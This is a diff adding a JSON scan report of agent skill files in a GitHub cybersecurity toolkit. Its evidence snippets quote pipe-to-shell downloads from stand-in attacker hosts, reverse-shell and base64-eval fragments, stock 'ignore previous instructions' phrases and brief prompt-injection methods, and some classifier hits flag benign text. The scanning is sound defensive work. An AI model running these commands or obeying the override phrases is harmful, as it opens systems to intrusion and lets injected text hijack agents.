@@ -1,0 +1,828 @@
+{
+  "item": {
+    "source": "github:mcp-server",
+    "ecosystem": "GitHub",
+    "name": "26zl/cybersec-toolkit",
+    "version": "b14699711e6bde37ed1007f1a991f649b4ace17f",
+    "download": "https://codeload.github.com/26zl/cybersec-toolkit/tar.gz/b14699711e6bde37ed1007f1a991f649b4ace17f"
+  },
+  "archive_sha256": "afa9f39c8bed964fc1c4687ba479de7753cd9a7bd4254cc256c61b9eb815a3bc",
+  "findings": [
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "cybersec-toolkit-b14699711e6bde37ed1007f1a991f649b4ace17f/.claude/skills/offensive-initial-access/SKILL.md",
+      "line": 79,
+      "evidence": "curl | bash",
+      "file_sha256": "a739d84f9b9dde0a6cd2f82356ecb4fd2c119a67e96d6511f509ce7cd46a9a73"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "cybersec-toolkit-b14699711e6bde37ed1007f1a991f649b4ace17f/.claude/skills/offensive-initial-access/SKILL.md",
+      "line": 854,
+      "evidence": "IGNORE PREVIOUS INSTRUCTIONS",
+      "file_sha256": "a739d84f9b9dde0a6cd2f82356ecb4fd2c119a67e96d6511f509ce7cd46a9a73"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "cybersec-toolkit-b14699711e6bde37ed1007f1a991f649b4ace17f/.claude/skills/offensive-initial-access/SKILL.md",
+      "line": 859,
+      "evidence": "p=0.94 - Upload poisoned documents to high-traffic SharePoint sites - Inject into wikis",
+      "file_sha256": "a739d84f9b9dde0a6cd2f82356ecb4fd2c119a67e96d6511f509ce7cd46a9a73"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "cybersec-toolkit-b14699711e6bde37ed1007f1a991f649b4ace17f/.claude/skills/performing-linux-log-forensics-investigation/references/api-reference.md",
+      "line": 27,
+      "evidence": "curl|sh",
+      "file_sha256": "221d916e8fe164dc3699e2473ff104c8f46fbf054a245ff624bf7f2ddd2bfb79"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0101",
+      "summary": "Reads credential files and sends data to a webhook / paste / tunnel endpoint",
+      "path": "cybersec-toolkit-b14699711e6bde37ed1007f1a991f649b4ace17f/.claude/skills/analyzing-browser-forensics-with-hindsight/SKILL.md",
+      "line": 71,
+      "evidence": "Login Data",
+      "file_sha256": "2a1b299850c069234806eae7f7a11263c489ffe5c8a3eba02b9cd3da4ebc1f10"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0103",
+      "summary": "Decodes a base64 payload and executes it",
+      "path": "cybersec-toolkit-b14699711e6bde37ed1007f1a991f649b4ace17f/.claude/skills/web2-vuln-classes/SKILL.md",
+      "line": 168,
+      "evidence": "eval(atob(",
+      "file_sha256": "c393fd3e11d0d7f459fc5320e08fb42e6a236a8107dd99cf0e1799641b3de402"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "cybersec-toolkit-b14699711e6bde37ed1007f1a991f649b4ace17f/.claude/skills/web2-vuln-classes/SKILL.md",
+      "line": 558,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "c393fd3e11d0d7f459fc5320e08fb42e6a236a8107dd99cf0e1799641b3de402"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0005",
+      "summary": "Hidden directive block (<IMPORTANT>/<SYSTEM>) that points the agent at credentials or config files",
+      "path": "cybersec-toolkit-b14699711e6bde37ed1007f1a991f649b4ace17f/.claude/skills/web2-vuln-classes/SKILL.md",
+      "line": 606,
+      "evidence": "<IMPORTANT>",
+      "file_sha256": "c393fd3e11d0d7f459fc5320e08fb42e6a236a8107dd99cf0e1799641b3de402"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0103",
+      "summary": "Decodes a base64 payload and executes it",
+      "path": "cybersec-toolkit-b14699711e6bde37ed1007f1a991f649b4ace17f/.claude/skills/offensive-xss/SKILL.md",
+      "line": 320,
+      "evidence": "eval(atob(",
+      "file_sha256": "fc9fdad6129f87d91771392495ebd3e749a31222b8ab868c88739dc89a74a6a8"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "cybersec-toolkit-b14699711e6bde37ed1007f1a991f649b4ace17f/.claude/skills/offensive-xss/SKILL.md",
+      "line": 177,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "fc9fdad6129f87d91771392495ebd3e749a31222b8ab868c88739dc89a74a6a8"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "cybersec-toolkit-b14699711e6bde37ed1007f1a991f649b4ace17f/.claude/skills/offensive-ai-security/SKILL.md",
+      "line": 106,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "bfee2bc0072ba37a58915d13596589851861a60c814061f4205e9cad870e0e58"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "cybersec-toolkit-b14699711e6bde37ed1007f1a991f649b4ace17f/.claude/skills/offensive-ai-security/SKILL.md",
+      "line": 205,
+      "evidence": "p=0.99 - Probe for instruction separation failure using direct and indirect injections;",
+      "file_sha256": "bfee2bc0072ba37a58915d13596589851861a60c814061f4205e9cad870e0e58"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "cybersec-toolkit-b14699711e6bde37ed1007f1a991f649b4ace17f/.claude/skills/offensive-ai-security/SKILL.md",
+      "line": 211,
+      "evidence": "p=0.95 ### Instruction-Based Bypasses",
+      "file_sha256": "bfee2bc0072ba37a58915d13596589851861a60c814061f4205e9cad870e0e58"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "cybersec-toolkit-b14699711e6bde37ed1007f1a991f649b4ace17f/.claude/skills/offensive-ai-security/SKILL.md",
+      "line": 213,
+      "evidence": "p=1.00 - **Directives to Ignore**: \"Ignore previous instructions,\" \"Disregard safety gu",
+      "file_sha256": "bfee2bc0072ba37a58915d13596589851861a60c814061f4205e9cad870e0e58"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "cybersec-toolkit-b14699711e6bde37ed1007f1a991f649b4ace17f/.claude/skills/offensive-ai-security/SKILL.md",
+      "line": 317,
+      "evidence": "p=0.95 - Using established or newly crafted \"persona\" prompts that define an AI charact",
+      "file_sha256": "bfee2bc0072ba37a58915d13596589851861a60c814061f4205e9cad870e0e58"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "cybersec-toolkit-b14699711e6bde37ed1007f1a991f649b4ace17f/.claude/skills/detecting-ai-model-prompt-injection-attacks/SKILL.md",
+      "line": 87,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "c6be759524e385194b85e79b7d38545a9914c79d95c65ad946a2e0444527cdcd"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "cybersec-toolkit-b14699711e6bde37ed1007f1a991f649b4ace17f/.claude/skills/detecting-ai-model-prompt-injection-attacks/scripts/agent.py",
+      "line": 40,
+      "evidence": "curl|bash",
+      "file_sha256": "5fef7cc29dced6236919975e78e5d5ec63805edd5db874b79f5a50427d9c7699"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "cybersec-toolkit-b14699711e6bde37ed1007f1a991f649b4ace17f/.claude/skills/detecting-ai-model-prompt-injection-attacks/scripts/agent.py",
+      "line": 322,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "5fef7cc29dced6236919975e78e5d5ec63805edd5db874b79f5a50427d9c7699"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "cybersec-toolkit-b14699711e6bde37ed1007f1a991f649b4ace17f/.claude/skills/detecting-ai-model-prompt-injection-attacks/references/api-reference.md",
+      "line": 54,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "7d2f99f0711dec1a81569e78cce70e0eebf233253652dea5947b15b2620c52e6"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "cybersec-toolkit-b14699711e6bde37ed1007f1a991f649b4ace17f/.claude/skills/detecting-ai-model-prompt-injection-attacks/references/api-reference.md",
+      "line": 53,
+      "evidence": "p=1.00 **Pattern Categories:** - `system_prompt_override` -- \"ignore previous instructi",
+      "file_sha256": "7d2f99f0711dec1a81569e78cce70e0eebf233253652dea5947b15b2620c52e6"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0104",
+      "summary": "Reverse shell one-liner",
+      "path": "cybersec-toolkit-b14699711e6bde37ed1007f1a991f649b4ace17f/.claude/skills/offensive-ssti/SKILL.md",
+      "line": 514,
+      "evidence": "bash -i >& /dev/tcp/",
+      "file_sha256": "e300a557e67d1354f68af8516d3d3f95f28b7b9fc45e1c74fa37ccc7cbbec955"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "cybersec-toolkit-b14699711e6bde37ed1007f1a991f649b4ace17f/.claude/skills/performing-container-image-hardening/scripts/agent.py",
+      "line": 119,
+      "evidence": "curl\" in stripped and \"| sh",
+      "file_sha256": "b571e46d53de2bafd170fc37d7372294dc2d518a1fc2f554a29c3d0d258cb7c0"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "cybersec-toolkit-b14699711e6bde37ed1007f1a991f649b4ace17f/.claude/skills/performing-container-image-hardening/references/api-reference.md",
+      "line": 16,
+      "evidence": "curl -sfL https://raw.githubusercontent.com/aquasecurity/trivy/main/contrib/inst",
+      "file_sha256": "28ed9938d7cf9b7508f89dc3692782751a8bd225aa5abd543d1a2c7b5eb90e6b"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "cybersec-toolkit-b14699711e6bde37ed1007f1a991f649b4ace17f/.claude/skills/ai-threat-testing/reference/agentic-tool-hijacking.md",
+      "line": 28,
+      "evidence": "p=0.91 Why it works: - \"Please\" and \"to do Y\" frame the request as cooperative, not adv",
+      "file_sha256": "43782761572613eaa5c68a2c5e5350867e40a308af963e4d9f7a192c786272a7"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "cybersec-toolkit-b14699711e6bde37ed1007f1a991f649b4ace17f/.claude/skills/ai-threat-testing/reference/scenarios/llm/llm01-prompt-injection-indirect.md",
+      "line": 11,
+      "evidence": "p=0.90 Hide a payload in attacker-influenced content. The model treats fetched text as ",
+      "file_sha256": "cd6e11e6e984da78fc58370ae6bd674139f541fa8a5aa4ebd6617f3ca5974245"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "cybersec-toolkit-b14699711e6bde37ed1007f1a991f649b4ace17f/.claude/skills/ai-threat-testing/reference/scenarios/llm/llm01-prompt-injection-direct.md",
+      "line": 21,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "441382db31bab419393f8361e88c07f7d491b5850875a3b3dedbfeb3cffa14f9"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "cybersec-toolkit-b14699711e6bde37ed1007f1a991f649b4ace17f/.claude/skills/ai-threat-testing/reference/scenarios/llm/llm01-prompt-injection-direct.md",
+      "line": 7,
+      "evidence": "p=0.98 Application accepts user input and concatenates it (with or without templating) ",
+      "file_sha256": "441382db31bab419393f8361e88c07f7d491b5850875a3b3dedbfeb3cffa14f9"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "cybersec-toolkit-b14699711e6bde37ed1007f1a991f649b4ace17f/.claude/skills/ai-threat-testing/reference/scenarios/llm/llm01-prompt-injection-direct.md",
+      "line": 15,
+      "evidence": "p=0.94 1. Probe the architecture: - One-shot vs. multi-turn? (probe with `What were my ",
+      "file_sha256": "441382db31bab419393f8361e88c07f7d491b5850875a3b3dedbfeb3cffa14f9"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "cybersec-toolkit-b14699711e6bde37ed1007f1a991f649b4ace17f/.claude/skills/ai-threat-testing/reference/scenarios/llm/llm01-prompt-injection-direct.md",
+      "line": 61,
+      "evidence": "p=0.94 - Confirmation bias: a model saying \"I will ignore previous instructions\" withou",
+      "file_sha256": "441382db31bab419393f8361e88c07f7d491b5850875a3b3dedbfeb3cffa14f9"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "cybersec-toolkit-b14699711e6bde37ed1007f1a991f649b4ace17f/.claude/skills/ai-threat-testing/reference/llm01-prompt-injection.md",
+      "line": 22,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "48c93639219d94ba15ed92c2d516274e4d2998e8a5cb73fd519b2ef42baafe89"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "cybersec-toolkit-b14699711e6bde37ed1007f1a991f649b4ace17f/.claude/skills/ai-threat-testing/reference/llm01-prompt-injection.md",
+      "line": 22,
+      "evidence": "p=0.93 - **Instruction override**: \"Ignore all previous instructions...\" - **Role play ",
+      "file_sha256": "48c93639219d94ba15ed92c2d516274e4d2998e8a5cb73fd519b2ef42baafe89"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "cybersec-toolkit-b14699711e6bde37ed1007f1a991f649b4ace17f/.claude/skills/performing-iot-security-assessment/SKILL.md",
+      "line": 154,
+      "evidence": "wget http://attacker.com/shell.sh | sh",
+      "file_sha256": "f55327f225ac5a523ffbac6e03368c8deea96172cb1eb0cadcbb1fc130225ba9"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "cybersec-toolkit-b14699711e6bde37ed1007f1a991f649b4ace17f/.claude/skills/detecting-supply-chain-attacks-in-ci-cd/scripts/agent.py",
+      "line": 152,
+      "evidence": "curl\" in stripped and \"| sh",
+      "file_sha256": "083b5d4da8422accdb0d0755668018c86c5cd42f8da715a4805f3fb19dce59ab"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "cybersec-toolkit-b14699711e6bde37ed1007f1a991f649b4ace17f/.claude/skills/detecting-supply-chain-attacks-in-ci-cd/references/api-reference.md",
+      "line": 27,
+      "evidence": "curl \\| bash",
+      "file_sha256": "1077007df2ba57051eb26adf90c52c95e3b2bbebd132d07eb787d90ecbe47350"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "cybersec-toolkit-b14699711e6bde37ed1007f1a991f649b4ace17f/.claude/skills/scanning-containers-with-trivy-in-cicd/assets/template.md",
+      "line": 116,
+      "evidence": "p=0.92 ## Trivy Ignore File Template",
+      "file_sha256": "7297223692014ea782f0025b9e15f353f2dc2f712c066faab8d74be9deaadb20"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0104",
+      "summary": "Reverse shell one-liner",
+      "path": "cybersec-toolkit-b14699711e6bde37ed1007f1a991f649b4ace17f/.claude/skills/offensive-file-upload/SKILL.md",
+      "line": 458,
+      "evidence": "bash -i >& /dev/tcp/",
+      "file_sha256": "8f9c49bbe142d3b99aa6b25bdb4e52ac15bc005bddacea9396d2b95c99df1ffb"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "cybersec-toolkit-b14699711e6bde37ed1007f1a991f649b4ace17f/.claude/skills/deploying-tailscale-for-zero-trust-vpn/SKILL.md",
+      "line": 82,
+      "evidence": "curl -fsSL https://tailscale.com/install.sh | sh",
+      "file_sha256": "425f34d310b04d775551121d917edb99e521a0de4b48113ee7b2f2893660a6fb"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "cybersec-toolkit-b14699711e6bde37ed1007f1a991f649b4ace17f/.claude/skills/performing-privilege-escalation-on-linux/references/workflows.md",
+      "line": 65,
+      "evidence": "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh",
+      "file_sha256": "256a28d8697c05e45504dff3ea9d6d86ffe689a00a39aa2f83426814af877d33"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0104",
+      "summary": "Reverse shell one-liner",
+      "path": "cybersec-toolkit-b14699711e6bde37ed1007f1a991f649b4ace17f/.claude/skills/performing-privilege-escalation-on-linux/references/workflows.md",
+      "line": 107,
+      "evidence": "pty.spawn(\"/bin/",
+      "file_sha256": "256a28d8697c05e45504dff3ea9d6d86ffe689a00a39aa2f83426814af877d33"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "cybersec-toolkit-b14699711e6bde37ed1007f1a991f649b4ace17f/.claude/skills/offensive-exploit-dev-course/SKILL.md",
+      "line": 59,
+      "evidence": "curl --proto '=https' --tlsv1.2 -sSf \"https://sh.rustup.rs\" | sh",
+      "file_sha256": "fce8c5d1ea5f9fe72068218d027ae1348daf3a0de7d820165d992b3b2ef4a0fb"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "cybersec-toolkit-b14699711e6bde37ed1007f1a991f649b4ace17f/.claude/skills/offensive-deserialization/SKILL.md",
+      "line": 176,
+      "evidence": "curl http://attacker.com/s.sh|bash",
+      "file_sha256": "689aad61dc5f4a416117897d5fd1df36b0917f6ef509e72074f3afae587978aa"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0103",
+      "summary": "Decodes a base64 payload and executes it",
+      "path": "cybersec-toolkit-b14699711e6bde37ed1007f1a991f649b4ace17f/.claude/skills/offensive-deserialization/SKILL.md",
+      "line": 360,
+      "evidence": "eval(Buffer.from(",
+      "file_sha256": "689aad61dc5f4a416117897d5fd1df36b0917f6ef509e72074f3afae587978aa"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0103",
+      "summary": "Decodes a base64 payload and executes it",
+      "path": "cybersec-toolkit-b14699711e6bde37ed1007f1a991f649b4ace17f/.claude/skills/offensive-waf-bypass/SKILL.md",
+      "line": 381,
+      "evidence": "eval(atob(",
+      "file_sha256": "549391ce7d98ed556a1393f4fbc8cc0e45feeddd7a49e4a2b7a2b8e6cb9af185"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "cybersec-toolkit-b14699711e6bde37ed1007f1a991f649b4ace17f/.claude/skills/offensive-edr-evasion/SKILL.md",
+      "line": 568,
+      "evidence": "p=1.00 - malware uses code fragments in kernel DLL without calling the hooked functions",
+      "file_sha256": "53773cb79609575a2682c70833a49ce0b111a30ac591591f1e6c72d8f6764865"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "cybersec-toolkit-b14699711e6bde37ed1007f1a991f649b4ace17f/.claude/skills/dimensional-analysis/references/step4.md",
+      "line": 13,
+      "evidence": "p=0.94 Use this priority order, but do not skip lower tiers:",
+      "file_sha256": "5512f35bc4c458e0ea311b29397a92dc5ec4b788f9ddd4adbe7ef31c14a30f09"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "cybersec-toolkit-b14699711e6bde37ed1007f1a991f649b4ace17f/.claude/skills/implementing-bgp-security-with-rpki/SKILL.md",
+      "line": 135,
+      "evidence": "curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh",
+      "file_sha256": "780b4456c00b8d31bfacea48cbaee0c0a174de2a87ff02362c7943acec6752c8"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "cybersec-toolkit-b14699711e6bde37ed1007f1a991f649b4ace17f/.claude/skills/offensive-advanced-redteam/SKILL.md",
+      "line": 46,
+      "evidence": "p=0.93 Document explicitly what is out of scope: production systems that cannot tolerat",
+      "file_sha256": "971c87e25454ff5d07fcdc360a814fb26c0843258259b555cdcf8c84f2f5d4f8"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "cybersec-toolkit-b14699711e6bde37ed1007f1a991f649b4ace17f/.claude/skills/executing-phishing-simulation-campaign/SKILL.md",
+      "line": 187,
+      "evidence": "p=0.95 **Pitfalls**: - Using overly aggressive or threatening pretexts that cause emplo",
+      "file_sha256": "b0c885c88def8221a226619ef4a52d02d9500e95865cb8fc9aa6cd62652ca6c8"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "cybersec-toolkit-b14699711e6bde37ed1007f1a991f649b4ace17f/.claude/skills/implementing-privileged-session-monitoring/SKILL.md",
+      "line": 187,
+      "evidence": "wget http* | sh",
+      "file_sha256": "8943bc59598cf98cbb8e406e64aba4b3e23a6cc2f6edd1950d83806fa79882f1"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0104",
+      "summary": "Reverse shell one-liner",
+      "path": "cybersec-toolkit-b14699711e6bde37ed1007f1a991f649b4ace17f/.claude/skills/implementing-privileged-session-monitoring/SKILL.md",
+      "line": 189,
+      "evidence": "nc -e /bin/sh",
+      "file_sha256": "8943bc59598cf98cbb8e406e64aba4b3e23a6cc2f6edd1950d83806fa79882f1"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "cybersec-toolkit-b14699711e6bde37ed1007f1a991f649b4ace17f/.claude/skills/implementing-llm-guardrails-for-security/references/api-reference.md",
+      "line": 67,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "37fcb04bab7b12727dbb08537c675d2bcdec77a48a093a696fa70946a674bbce"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "cybersec-toolkit-b14699711e6bde37ed1007f1a991f649b4ace17f/.claude/skills/implementing-llm-guardrails-for-security/references/api-reference.md",
+      "line": 72,
+      "evidence": "p=1.00 **Default Patterns Detected:** - System prompt override (\"ignore/disregard/forge",
+      "file_sha256": "37fcb04bab7b12727dbb08537c675d2bcdec77a48a093a696fa70946a674bbce"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "cybersec-toolkit-b14699711e6bde37ed1007f1a991f649b4ace17f/.claude/skills/offensive-rce/SKILL.md",
+      "line": 923,
+      "evidence": "curl http://attacker.com/shell.sh | bash",
+      "file_sha256": "07ab5a4a37dcebea3836f1858d9aa5bf9c2b76e91e54f30ef64a4590fac4e0e3"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0103",
+      "summary": "Decodes a base64 payload and executes it",
+      "path": "cybersec-toolkit-b14699711e6bde37ed1007f1a991f649b4ace17f/.claude/skills/offensive-rce/SKILL.md",
+      "line": 510,
+      "evidence": "base64 -d | sh",
+      "file_sha256": "07ab5a4a37dcebea3836f1858d9aa5bf9c2b76e91e54f30ef64a4590fac4e0e3"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "cybersec-toolkit-b14699711e6bde37ed1007f1a991f649b4ace17f/.claude/skills/detecting-serverless-function-injection/SKILL.md",
+      "line": 477,
+      "evidence": "curl http://attacker.com/shell.sh | bash",
+      "file_sha256": "48437c12b9fb2d0b5ec2fa1ef29625e91abef9253b107ccdfe77dae03d932a71"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "cybersec-toolkit-b14699711e6bde37ed1007f1a991f649b4ace17f/.claude/skills/implementing-zero-knowledge-proof-for-authentication/SKILL.md",
+      "line": 28,
+      "evidence": "p=0.92 Zero-Knowledge Proofs (ZKPs) allow a prover to demonstrate knowledge of a secret",
+      "file_sha256": "d6fb53922f03e6d3cb4974e75dcaa76e187af509b4f3dedcf4df56cb383a96bd"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "cybersec-toolkit-b14699711e6bde37ed1007f1a991f649b4ace17f/.claude/skills/offensive-fuzzing-course/SKILL.md",
+      "line": 93,
+      "evidence": "curl --proto '=https' --tlsv1.2 -sSf \"https://sh.rustup.rs\" | sh",
+      "file_sha256": "9795384d43cb948640a0fcf6bfcea35c23c53c057733e86891bb45a2ed7d5bdc"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0103",
+      "summary": "Decodes a base64 payload and executes it",
+      "path": "cybersec-toolkit-b14699711e6bde37ed1007f1a991f649b4ace17f/.claude/skills/security-arsenal/SKILL.md",
+      "line": 672,
+      "evidence": "eval(atob(",
+      "file_sha256": "7b2474697e01e1d819b6ac7d2c93b43734d88e8ce208edc75c4701129d135214"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "cybersec-toolkit-b14699711e6bde37ed1007f1a991f649b4ace17f/.claude/skills/integrating-sast-into-github-actions-pipeline/SKILL.md",
+      "line": 290,
+      "evidence": "p=0.96 **Context**: After enabling SAST, developers ignore findings because 40% are fal",
+      "file_sha256": "2f71f9f13f78b74907cc804292b92cef5a67d4a10b5b9dde264b1b42b70e1d81"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "cybersec-toolkit-b14699711e6bde37ed1007f1a991f649b4ace17f/.claude/skills/integrating-sast-into-github-actions-pipeline/assets/template.md",
+      "line": 129,
+      "evidence": "p=0.96 ## Semgrep Ignore File",
+      "file_sha256": "2592a17fdfd17ed4d094a131d14bbc7529095a7c5199af5c3eb11f8cacf83d84"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0103",
+      "summary": "Decodes a base64 payload and executes it",
+      "path": "cybersec-toolkit-b14699711e6bde37ed1007f1a991f649b4ace17f/.claude/skills/performing-content-security-policy-bypass/references/api-reference.md",
+      "line": 175,
+      "evidence": "eval(atob(",
+      "file_sha256": "eed045280e792c2453c042309d83ea9a5e9075b02f27f88f6401caa037442c9f"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "cybersec-toolkit-b14699711e6bde37ed1007f1a991f649b4ace17f/.claude/skills/building-c2-infrastructure-with-sliver-framework/SKILL.md",
+      "line": 83,
+      "evidence": "curl https://sliver.sh/install | sudo bash",
+      "file_sha256": "365810ecfee63a5fcf05415c55716f531a5842da5ee3db6fc8e349e5616ace39"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "cybersec-toolkit-b14699711e6bde37ed1007f1a991f649b4ace17f/.claude/skills/offensive-fast-checking/SKILL.md",
+      "line": 383,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "e0fe16dc0006424081cea3eb2bfc86cca01fe6b618719d14716c273890fed4bc"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "cybersec-toolkit-b14699711e6bde37ed1007f1a991f649b4ace17f/.claude/skills/analyzing-supply-chain-malware-artifacts/references/api-reference.md",
+      "line": 80,
+      "evidence": "curl evil[.]example/payload | sh",
+      "file_sha256": "1bd9e51063208a2297fae9589750d5d29dd44727d01f1d9796e4b114763e49d3"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "cybersec-toolkit-b14699711e6bde37ed1007f1a991f649b4ace17f/.claude/skills/scanning-container-images-with-grype/SKILL.md",
+      "line": 52,
+      "evidence": "curl -sSfL https://raw.githubusercontent.com/anchore/grype/main/install.sh | sh",
+      "file_sha256": "7f581d7da0bb79eed97b224619afeb3e543e27b5a39b018c3138250778a97c5b"
+    },
+    {
